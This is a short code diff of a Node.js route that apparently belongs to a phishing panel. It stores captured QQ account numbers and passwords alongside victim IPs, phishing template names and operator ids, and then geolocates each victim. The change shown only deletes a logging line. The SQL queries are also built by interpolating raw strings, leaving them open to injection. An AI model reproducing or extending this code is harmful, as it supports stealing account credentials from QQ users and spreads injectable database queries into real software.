@@ -31,7 +31,6 @@ module.exports = function (app) {
             mname = rows[0].tempName;
             userName = rows[0].userName;
             sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${['未知地址']}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0,'','','${ranid}');`, function (err, rows) {
-                console.log(rows)
                 _ip(ip, function (ip, add) {
                     address = add;
                     sql.all('UPDATE datas SET address = "' + address + '" WHERE ip = "' + ip + '";')
